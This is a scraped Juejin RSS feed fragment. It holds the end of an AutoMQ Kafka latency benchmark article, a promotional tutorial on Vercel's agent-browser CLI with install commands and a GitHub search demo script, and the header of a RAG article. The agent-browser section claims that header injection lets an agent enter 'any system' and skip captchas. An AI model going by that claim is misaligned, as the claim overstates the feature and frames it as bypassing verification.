<p><code>linger.ms</code>=0 即不等待攒批完成，如果当前进行中请求不超过请求最大并发数，则会立即将消息发送到服务端，这种情况下耗时客户端耗时最短。但当随着业务量峰谷的变化，写入吞吐量、TPS 上涨等，可能会受请求并发数限制产生额外的客户端排队，从而影响最终的延迟。</p>
<p>所以，该场景为理想情况下的延迟；虽然耗时更短，但容易受业务量、客户端数量的影响出现起伏，不够稳定。
<br/></p>
<h4 data-id="heading-11"><strong>耗时更加稳定的场景</strong></h4>
<p>既然极致性能场景存在波动的风险，那么在追求吞吐量与稳定性平衡的生产环境下，AutoMQ 的表现又会如何呢？接下来让我们观察在开启客户端攒批后的稳态测试结果。</p>
<ul>
<li><code>batch.size</code>=64K</li>
<li><code>linger.ms</code>=3（根据服务端处理耗时估算出客户端攒批的时间）</li>
</ul>
<p>具体配置如下：</p>
<pre><code class="hljs language-ini" lang="ini">name: Kafka
driverClass: io.openmessaging.benchmark.driver.kafka.KafkaBenchmarkDriver
<span class="hljs-comment"># Kafka client-specific configuration</span>
replicationFactor: 1
topicConfig: |
  <span class="hljs-attr">min.insync.replicas</span>=<span class="hljs-number">2</span>
commonConfig: |
  <span class="hljs-attr">bootstrap.servers</span>=<span class="hljs-number">10.0</span>.<span class="hljs-number">0.112</span>:<span class="hljs-number">9092</span>
producerConfig: |
  <span class="hljs-attr">acks</span>=<span class="hljs-number">1</span>
  <span class="hljs-attr">linger.ms</span>=<span class="hljs-number">3</span>
  <span class="hljs-attr">batch.size</span>=<span class="hljs-number">65536</span>
  <span class="hljs-attr">client.id</span>=automq_type=producer&amp;automq_az=us-east-<span class="hljs-number">1</span>b
consumerConfig: |
  <span class="hljs-attr">auto.offset.reset</span>=earliest
  <span class="hljs-attr">enable.auto.commit</span>=<span class="hljs-literal">true</span>
  <span class="hljs-attr">client.id</span>=automq_type=consumer&amp;automq_az=us-east-<span class="hljs-number">1</span>b
</code></pre>
<p>更小的消息会带来更多的写入消耗，为了更有通用性，我们将 recordsize 设置了更小，以使结果在更多的场景适用。</p>
<ul>
<li>record.size = 1K</li>
<li>写入 TPS = 307200</li>
<li>分区总数 = 96</li>
<li>Producer = 15</li>
</ul>
<p>具体工作负载配置如下：</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-symbol">name:</span> <span class="hljs-number">1</span> Robust latency <span class="hljs-keyword">case</span>
<span class="hljs-symbol">topics:</span> <span class="hljs-number">1</span>
<span class="hljs-symbol">partitionsPerTopic:</span> <span class="hljs-number">32</span>
<span class="hljs-symbol">messageSize:</span> <span class="hljs-number">1024</span>
<span class="hljs-symbol">payloadFile:</span> <span class="hljs-string">"payload/payload-1Kb.data"</span>
<span class="hljs-symbol">subscriptionsPerTopic:</span> <span class="hljs-number">4</span>
<span class="hljs-symbol">consumerPerSubscription:</span> <span class="hljs-number">5</span>
<span class="hljs-symbol">producersPerTopic:</span> <span class="hljs-number">5</span>
<span class="hljs-symbol">producerRate:</span> <span class="hljs-number">102400</span>
<span class="hljs-symbol">consumerBacklogSizeGB:</span> <span class="hljs-number">0</span>
</code></pre>
<br/>
<h5 data-id="heading-12"><strong>运行结果</strong></h5>
<p>写入总吞吐图 300MiB/s，读取约 1.2GiB/s；</p>
<p><img src="https://image.automq.com/20260114bot/5gw9o1.png" alt="" loading="lazy"/></p>
<p>CPU 消耗约 31.5%，内存占用约 14G；</p>
<p><img src="https://image.automq.com/20260114bot/gxefe5.png" alt="" loading="lazy"/></p>
<p>写入平均延迟 7.89ms、P99 16.30ms、P999 30.26ms；</p>
<p><img src="https://image.automq.com/20260114bot/0dhgxi.png" alt="" loading="lazy"/></p>
<p>端到端平均延迟 9.88ms、22.0ms、38.0ms；</p>
<p><img src="https://image.automq.com/20260114bot/9kg8ta.png" alt="" loading="lazy"/></p>
<p><img src="https://image.automq.com/20260114bot/mf4w16.png" alt="" loading="lazy"/></p>
<p>增加了<code>linger.ms</code>=3 会带来额外的客户端延迟，但能带来更加稳定的攒批结果，能更好的应对业务流量峰谷，集群扩缩容 Producer 数目变化对延迟的影响，能够提供更加稳定的延迟表现，在实际生产中更具有参考意义。</p>
<p>此外，测试用例是按照集群满负载的情况运行，对 P99、P999 的更具有挑战。AutoMQ 内部经过大量优化，以确保文件系统耗时更加稳定。</p>
<p>从文件系统写入延迟热力图看 90%的写入响应都在 1ms 以下，同时 91%的读取都在 1ms 以下。</p>
<p><img src="https://image.automq.com/20260114bot/ct2a3e.png" alt="" loading="lazy"/></p>
<p><img src="https://image.automq.com/20260114bot/k4ebot.png" alt="" loading="lazy"/>
<br/></p>
<h2 data-id="heading-13"><strong>关于成本</strong></h2>
<br/>
<p>看到这里，你可能会产生疑问：既然性能实现了如此惊人的飞跃，成本是否也会随之“水涨船高”？</p>
<p>事实恰恰相反。在 AutoMQ 的集成架构中，FSxN 并非用于海量数据的长期堆积，而是仅作为“高速缓冲站”运行。它只负责承载极少量的最新预写日志（WAL），而海量的业务数据依然存储在价格极低的 S3 中。</p>
<p>为什么成本依然极低：</p>
<ul>
<li><strong>按需占用，规模固定：</strong> 由于数据会迅速沉降到 S3 存储桶，FSxN 仅需占用极小且固定的资源容量，不会随业务数据量的增长而产生高额费用。</li>
<li><strong>省下巨额流量费：</strong> 虽然集成 FSxN 会带来少量的资源开销，但它彻底消除了传统 Kafka 最昂贵的“跨 AZ 复制流量费”。</li>
<li><strong>99% 的存储在 S3：</strong> 绝大部分数据都存储在成本极低的 S3 上。</li>
</ul>
<p>这意味着即使集成了 FSxN 提升性能，AutoMQ 的整体拥有成本（TCO）依然比传统 Kafka 节省近 90%。</p>
<p>详细可以查看：👉 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgo.automq.com%2Fautomq-fsx-10ms-latency-diskless-kafka-on-aws" target="_blank" title="https://go.automq.com/automq-fsx-10ms-latency-diskless-kafka-on-aws" ref="nofollow noopener noreferrer">AutoMQ x FSx: 10ms Latency Diskless Kafka on AWS</a>
<br/></p>
<h2 data-id="heading-14"><strong>总结</strong></h2>
<br/>
<p>通过引入 FSxN 作为 WAL，<a href="https://link.juejin.cn?target=https%3A%2F%2Fgo.automq.com%2Fhome" target="_blank" title="https://go.automq.com/home" ref="nofollow noopener noreferrer">AutoMQ</a> 在保持跨 AZ 容灾与 S3 存算分离优势的同时，将平均写入延迟从数百毫秒大幅降至 10ms 以内，性能表现媲美本地磁盘。这一突破彻底补齐了 Diskless 架构的性能短板，使其能够以极具竞争力的成本和高稳定性，完美支撑微服务、风控及交易撮合等延迟敏感型核心业务。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vercel 凌晨突发：agent-browser 来了，减少 93% 上下文！AI 终于有了“操纵现实”的手！ 🚀]]></title>    <link>https://juejin.cn/post/7594722586732773382</link>    <guid>https://juejin.cn/post/7594722586732773382</guid>    <pubDate>2026-01-14T06:51:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594722586732773382" data-draft-id="7594863660296863786" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vercel 凌晨突发：agent-browser 来了，减少 93% 上下文！AI 终于有了“操纵现实”的手！ 🚀"/> <meta itemprop="keywords" content="人工智能,机器学习,爬虫"/> <meta itemprop="datePublished" content="2026-01-14T06:51:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Delroy"/> <meta itemprop="url" content="https://juejin.cn/user/184373682644119"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vercel 凌晨突发：agent-browser 来了，减少 93% 上下文！AI 终于有了“操纵现实”的手！ 🚀
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/184373682644119/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Delroy
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T06:51:20.000Z" title="Wed Jan 14 2026 06:51:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Vercel 凌晨突发：agent-browser 来了，减少 93% 上下文！AI 终于有了“操纵现实”的手！ 🚀</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fa1b748ed4c946acb7d9f049907890d5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGVscm95:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768978280&amp;x-signature=CK19ntBZl8UfWxfEbghtM6ipNDw%3D" alt="vercel_agent_cover.jpg" loading="lazy"/></p>
<blockquote>
<p><strong>导语</strong>：在 AI 领域，我们正处于一个尴尬的过渡期：AI 拥有了“最强大脑”，却依然是一等残废——它能教你如何订票，却无法帮你按下那个“提交”按钮。</p>
<p>2026 年 1 月，Vercel Labs 终于向这个痛点开火了。他们正式发布了 <strong><code>agent-browser</code></strong>，一个专为 AI Agent 设计的浏览器自动化 CLI。它不仅给 AI 装上了“手”，更可怕的是，它通过黑科技将浏览器操作的上下文占用减少了 <strong>93%</strong>。</p>
<p>别再让你的 AI 在 HTML 的汪洋大海里“溺水”了，今天我们就来深度拆解这个可能改变 Agent 游戏规则的神器。</p>
</blockquote>
<hr/>
<h3 data-id="heading-1">一、 为什么我们要关注 <code>agent-browser</code>？</h3>
<p>长期以来，让 AI 自动化操作浏览器一直是开发者的噩梦。</p>
<p>如果你尝试过用传统的 Playwright 或 Puppeteer 对接大模型（LLM），你一定遇到过这些问题：</p>
<ol>
<li><strong>Token 爆炸</strong>：一个普通的网页 HTML 动辄几万行，喂给 AI 直接就把上下文撑爆了，费用贵得离谱。</li>
<li><strong>AI 的“老花眼”</strong>：面对复杂的 DOM 树，AI 经常找错按钮，或者在嵌套的 <code>&lt;div&gt;</code> 里迷失自我。</li>
<li><strong>环境复杂</strong>：配置 Headless 浏览器、驱动、依赖，还没开始写逻辑，环境就配了两小时。</li>
</ol>
<p>Vercel 的 <code>agent-browser</code> 正是为此而生。它不是给人类用的浏览器，它是给 <strong>AI Agent 专用</strong> 的交互协议。</p>
<hr/>
<h3 data-id="heading-2">二、 快速安装：一分钟开启“上帝模式”</h3>
<p>Vercel 保持了一贯的“零配置”风格。你只需要一行命令：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 使用 npm 全局安装</span>
npm install -g agent-browser

<span class="hljs-comment"># 下载必要的浏览器二进制文件（Chromium）</span>
agent-browser install
</code></pre>
<p>如果你是在 Linux 服务器（如 Ubuntu）上运行，它甚至贴心地准备了依赖自动安装：</p>
<pre><code class="hljs language-bash" lang="bash">agent-browser install --with-deps
</code></pre>
<p>安装完成后，你的 AI 助手就拥有了调用浏览器的底层能力。</p>
<hr/>
<h3 data-id="heading-3">三、 核心原理：93% 上下文压缩的奥秘 🧠</h3>
<p>这是全篇最硬核的部分。为什么 <code>agent-browser</code> 能让 AI 变得如此高效？</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2e89dc1274eb4094a6a51dfc9edbe2b5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGVscm95:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768978280&amp;x-signature=x43RWdSN1x5LlIkvnWiRAqT%2BldI%3D" alt="token_reduction.jpg" loading="lazy"/></p>
<h4 data-id="heading-4">3.1 从 DOM 到 AOM 的降维打击</h4>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/83632c3c2cc8498bbbe111596725d4be~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGVscm95:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768978280&amp;x-signature=qFy%2FDaiXkQRqX3jIspmeiV2CuSg%3D" alt="dom_vs_aom.jpg" loading="lazy"/></p>
<p>传统的工具会将整个 <strong>DOM (Document Object Model)</strong> 发给 AI，里面充满了大量的样式、脚本和冗余节点。</p>
<p>而 <code>agent-browser</code> 选择了 <strong>AOM (Accessibility Object Model)</strong>，即无障碍对象模型。</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[原始网页] --&gt;|传统方案| B(完整 DOM 树)
    A --&gt;|agent-browser| C(无障碍树 AOM)
    B --&gt;|冗余信息多| D[AI 陷入 Token 泥潭]
    C --&gt;|只有核心语义| E[AI 精准锁定目标]
    E --&gt;|效率提升| F[减少 93% 上下文]
</code></pre>
<p><strong>原理拆解：</strong></p>
<ul>
<li><strong>过滤噪声</strong>：它剔除了所有对交互无用的 CSS 和视觉修饰。</li>
<li><strong>语义化提炼</strong>：它只告诉 AI 哪里是按钮（button）、哪里是输入框（textbox）、哪里是链接（link）。</li>
<li><strong>结构压缩</strong>：通过 <code>-i</code> (Interactive) 模式，它甚至可以只显示可交互元素，将原本几百 KB 的 HTML 压缩到几 KB。</li>
</ul>
<h4 data-id="heading-5">3.2 创新的 Ref 系统</h4>
<p>这是最让开发者高呼“优雅”的设计。在获取网页快照（Snapshot）时，<code>agent-browser</code> 会自动为每个元素分配一个临时的“身份证”——<strong>Ref</strong>。</p>
<p><strong>示例：</strong></p>
<ul>
<li><code>[ref=e1]</code> 代表登录按钮</li>
<li><code>[ref=e2]</code> 代表用户名输入框</li>
</ul>
<p>AI 不需要再写复杂的 <code>xpath</code> 或 <code>css selector</code>，它只需要说：<code>click @e1</code>。这种<strong>确定性</strong>的操作直接消灭了 AI 误操作的可能。</p>
<h4 data-id="heading-6">3.3 Rust + Node.js 混血架构</h4>
<p>为了追求极致的速度，<code>agent-browser</code> 采用了双引擎设计。根据 GitHub 仓库的实时代码分布（TypeScript 57.9%, Rust 38.9%），我们可以清晰地看到这种混合架构的特征：</p>
<ul>
<li><strong>前端 CLI (Rust)</strong>：负责指令解析和状态管理，快如闪电。</li>
<li><strong>后端守护进程 (Node.js)</strong>：常驻内存管理 Playwright 实例，避免了每次执行命令都要重新冷启动浏览器的延迟。</li>
</ul>
<hr/>
<h3 data-id="heading-7">四、 实战演习：让 AI 帮我们“查票”</h3>
<p>让我们看看一个真实的 AI 交互工作流。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/16155784ec82477da09a2101b200d00e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGVscm95:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768978280&amp;x-signature=KcYlku4Hz6jAkEHLXFvazMQN04M%3D" alt="agent_hand.jpg" loading="lazy"/></p>
<h4 data-id="heading-8">第一步：打开页面</h4>
<pre><code class="hljs language-bash" lang="bash">agent-browser open https://www.flight-search.com
</code></pre>
<h4 data-id="heading-9">第二步：获取 AI 友好的快照</h4>
<pre><code class="hljs language-bash" lang="bash">agent-browser snapshot -i --json
</code></pre>
<p>此时 AI 会收到一份整洁的 JSON，看到类似这样的内容：</p>
<blockquote>
<p><code>{"ref": "e1", "role": "textbox", "name": "出发地"}</code> &gt; <code>{"ref": "e2", "role": "textbox", "name": "目的地"}</code> &gt; <code>{"ref": "e3", "role": "button", "name": "搜索"}</code></p>
</blockquote>
<h4 data-id="heading-10">第三步：精准操作</h4>
<pre><code class="hljs language-bash" lang="bash">agent-browser fill @e1 <span class="hljs-string">"北京"</span>
agent-browser fill @e2 <span class="hljs-string">"上海"</span>
agent-browser click @e3
</code></pre>
<h4 data-id="heading-11">第四步：截屏验证（可选）</h4>
<pre><code class="hljs language-bash" lang="bash">agent-browser screenshot result.png
</code></pre>
<p>整个过程行云流水，AI 就像真的坐在电脑前操作一样。</p>
<hr/>
<h3 data-id="heading-12">五、 进阶：Authenticated Sessions（跳过登录）</h3>
<p>作为开发者，最讨厌的就是写登录爬虫。<code>agent-browser</code> 支持直接注入 Header：</p>
<pre><code class="hljs language-bash" lang="bash">agent-browser open api.example.com --headers <span class="hljs-string">'{"Authorization": "Bearer your_token"}'</span>
</code></pre>
<p>这意味着你的 AI Agent 可以直接以授权身份进入任何系统，跳过验证码，直接执行高价值任务。</p>
<hr/>
<h3 data-id="heading-13">六、实战彩蛋：用 AI 操控 AI 仓库</h3>
<p>既然我们已经掌握了屠龙技，怎能不试试呢？我为大家写了一个 Shell 脚本，演示如何利用 `agent-browser` 的 <strong>Semantic Locator</strong> 功能，无需分析 DOM，直接用自然语言操作 GitHub 搜索。</p>
<p><strong>你的本地实战步骤：</strong></p>
<ol>
<li>确保已安装工具：<code>npm i -g agent-browser &amp;&amp; agent-browser install</code></li>
<li>复制以下脚本为 <code>demo.sh</code> 并运行。</li>
<li>见证浏览器自动打开并搜索 Vercel 的仓库。</li>
</ol>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>

<span class="hljs-comment"># 先关闭所有 agent-browser 进程</span>
pkill -f agent-browser
<span class="hljs-built_in">sleep</span> 2

<span class="hljs-comment"># 自动搜索 GitHub Demo</span>

<span class="hljs-built_in">echo</span> <span class="hljs-string">"🚀 启动 Agent Browser..."</span>

<span class="hljs-comment"># 1. 打开 GitHub 搜索页</span>
<span class="hljs-comment"># --headed 让我们可以看到浏览器界面</span>
agent-browser <span class="hljs-built_in">set</span> viewport 1280 800
agent-browser open <span class="hljs-string">"https://github.com/search"</span> --headed

<span class="hljs-comment"># 2. 智能填写关键词 (使用稳健的选择器)</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"✍️ 正在输入关键词..."</span>
agent-browser fill <span class="hljs-string">"[aria-label='Search GitHub']"</span> <span class="hljs-string">"vercel/agent-browser"</span>

<span class="hljs-comment"># 3. 按回车触发搜索</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"🔍 提交搜索..."</span>
agent-browser press <span class="hljs-string">"Enter"</span>

<span class="hljs-built_in">echo</span> <span class="hljs-string">"✅ 搞定！AI 已帮你找到目标仓库。"</span>
</code></pre>
<p>这才是 Agent 的正确打开方式——<strong>像人一样思考，像机器一样执行。</strong></p>
<hr/>
<h3 data-id="heading-14">七、 总结：Vercel 的野心</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5162ad796e764255b8f6069eb95c1730~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGVscm95:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768978280&amp;x-signature=XmpMLr1glbQOiAAp84S%2FlbskTP0%3D" alt="ai_cloud_vision.jpg" loading="lazy"/>
<code>agent-browser</code> 的发布，标志着 Vercel 正在从一个“前端托管平台”转变为“<strong>AI Agent 基础设施提供商</strong>”。项目发布仅两天，GitHub Star 数已突破 <strong>2.8k</strong>，足见开发者社区的关注度。</p>
<p>它通过极致的工具链（Rust CLI）和创新的交互协议（AOM + Ref），彻底解决了 AI 与网页交互的“最后一百米”问题。当上下文占用减少了 93%，原本因为太贵、太慢而无法商用的 Agent 场景，现在全都变得可行了。</p>
<p><strong>代码和环境的关系很重要，但 AI 和现实世界的关系更重要。</strong></p>
<p>准备好给你的 AI 装上这双“操纵现实”的手了吗？</p>
<hr/>
<blockquote>
<p><strong>作者提示</strong>：</p>
<ol>
<li>项目仓库：<code>github.com/vercel-labs/agent-browser</code></li>
<li>建议搭配 Vercel 的 <code>v0</code> 模型使用，效果更佳。</li>
<li>如果本文对你有帮助，请点赞分享！ 😉</li>
</ol>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[重塑 LLM 的“第二大脑”——RAG 技术原理与核心价值深度解析]]></title>    <link>https://juejin.cn/post/7594801581003571236</link>    <guid>https://juejin.cn/post/7594801581003571236</guid>    <pubDate>2026-01-14T07:04:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594801581003571236" data-draft-id="7594722586732822534" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="重塑 LLM 的“第二大脑”——RAG 技术原理与核心价值深度解析"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-14T07:04:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="aibigdata"/> <meta itemprop="url" content="https://juejin.cn/user/3430122687593070"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            重塑 LLM 的“第二大脑”——RAG 技术原理与核心价值深度解析
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3430122687593070/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    aibigdata
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T07:04:35.000Z" title="Wed Jan 14 2026 07:04:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
